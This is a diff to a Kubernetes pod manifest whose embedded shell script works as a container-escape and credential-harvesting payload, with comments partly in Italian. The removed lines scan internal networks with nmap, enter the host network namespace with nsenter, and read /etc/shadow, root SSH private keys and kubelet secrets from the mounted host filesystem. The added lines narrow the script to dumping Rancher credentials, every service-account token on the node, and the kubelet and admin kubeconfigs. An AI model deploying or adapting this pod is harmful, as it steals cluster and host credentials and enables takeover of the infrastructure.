@@ -13,87 +13,26 @@ spec:
       - /bin/sh
       - -c
       - |
-        set -e
+        apk add --no-cache curl jq > /dev/null 2>&1
 
-        echo "[*] Installing tools..."
-        apk add --no-cache nmap curl iproute2 bind-tools net-tools util-linux procps jq findutils openssh-client sshpass > /dev/null 2>&1
-        echo "[*] Tools installed"
-
-        echo "=== HOSTNAME ==="
-        hostname
-
-        echo "=== IP ADDRESSES ==="
-        ip a
-
-        echo "=== ROUTES ==="
-        ip route
-
-        echo "=== DNS ==="
-        cat /etc/resolv.conf
-
-        echo "=== VPN INTERFACES (wg, tun, tap) ==="
-        ip a | grep -E "wg|tun|tap" || echo "Nessuna interfaccia VPN visibile"
-
-        echo "=== VPN CONFIG FILES ON HOST ==="
-        find /host -maxdepth 4 \( -name "*.ovpn" -o -name "wg0.conf" -o -name "*.conf" -path "*vpn*" \) 2>/dev/null | head -20 || true
-
-        echo "=== HOST NETWORK NAMESPACE (via nsenter) ==="
-        nsenter -t 1 -n -- ip a 2>&1 || true
-
-        echo "=== HOST ROUTES (via nsenter) ==="
-        nsenter -t 1 -n -- ip route 2>&1 || true
-
-        echo "=== HOST DNS (via nsenter) ==="
-        nsenter -t 1 -n -- cat /etc/resolv.conf 2>&1 || true
-
-        echo "=== HOST ARP (via nsenter) ==="
-        nsenter -t 1 -n -- arp -a 2>&1 || true
-
-        echo "=== SCAN RETE INTERNA (172.30.0.0/24) ==="
-        nmap -sT -p 22,80,443,3306,5432,6379,8080,8443,9200,27017,5601,9000 172.30.0.0/24 2>&1 | grep -E "Nmap scan report|open" || true
-
-        echo "=== SCAN RETE POD (10.42.11.0/24) ==="
-        nmap -sT -p 80,443,3000,5432,6379,8080,8443,9200,5601,9000 10.42.11.0/24 2>&1 | grep -E "Nmap scan report|open" || true
-
-        echo "=== KUBELET API (172.30.0.15:10250) ==="
-        curl -sk https://172.30.0.15:10250/pods 2>&1 | head -50 || true
-
-        echo "=== KUBELET SECRETS (via /host) ==="
-        find /host/var/lib/kubelet/pods -path "*kubernetes.io~secret*" -type f 2>/dev/null | while read f; do
+        echo "=== RANCHER CREDENTIALS (fresh) ==="
+        find /host/var/lib/kubelet/pods -path "*cattle-credentials*" -type f 2>/dev/null | while read f; do
           echo "--- $f ---"
-          cat "$f" 2>/dev/null | head -5
+          cat "$f" 2>/dev/null
           echo ""
         done
 
-        echo "=== KUBELET PODS ENV (via /host) ==="
-        find /host/var/lib/kubelet/pods -name "*.env" -o -name "env" 2>/dev/null | while read f; do
+        echo "=== ALL TOKENS ON NODE ==="
+        find /host/var/lib/kubelet/pods -name "token" -type f 2>/dev/null | while read f; do
           echo "--- $f ---"
-          cat "$f" 2>/dev/null | head -20
+          cat "$f" 2>/dev/null | head -1
           echo ""
         done
 
-        echo "=== KUBELET KUBECONFIG (credenziali nodo) ==="
+        echo "=== KUBELET KUBECONFIG ==="
         cat /host/etc/kubernetes/kubelet.conf 2>/dev/null || true
         cat /host/var/lib/kubelet/kubeconfig 2>/dev/null || true
         cat /host/etc/kubernetes/admin.conf 2>/dev/null || true
-
-        echo "=== DOCKER/CONTAINERD SOCKET ==="
-        ls -la /host/run/containerd/containerd.sock 2>/dev/null || true
-        ls -la /host/var/run/docker.sock 2>/dev/null || true
-
-        echo "=== HOST PASSWD ==="
-        cat /host/etc/passwd 2>/dev/null || true
-
-        echo "=== HOST SHADOW (hash) ==="
-        cat /host/etc/shadow 2>/dev/null | head -5 || true
-
-        echo "=== HOST SSH KEYS ==="
-        find /host/root/.ssh -type f 2>/dev/null | head -10 || true
-        cat /host/root/.ssh/id_rsa 2>/dev/null || true
-
-        echo "=== HOST CRON ==="
-        cat /host/etc/crontab 2>/dev/null || true
-        ls /host/etc/cron.d/ 2>/dev/null || true
 
         echo "=== DONE ==="
         sleep 36000
